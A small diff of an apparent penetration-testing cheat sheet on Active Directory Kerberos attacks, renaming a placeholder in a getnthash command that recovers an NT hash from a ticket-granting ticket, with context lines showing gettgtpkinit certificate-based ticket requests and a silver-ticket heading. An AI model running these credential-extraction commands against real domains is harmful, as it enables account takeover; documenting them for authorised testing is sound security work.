@@ -15,7 +15,7 @@ gettgtpkinit -cert-pfx <pfx_file_> -pfx-pass <pfx_password|jubeaz> -dc-ip <dc_ip
 ## hash from TGT and AS REP key
 #plateform/linux #target/remote #cat/RECON
 ```
-export KRB5CCNAME=<cache-path> && getnthash <domain>/<ComputerAccount> -key <key>
+export KRB5CCNAME=<ccache> && getnthash <domain>/<ComputerAccount> -key <key>
 ```
 
 ## silver ticket using a certificate
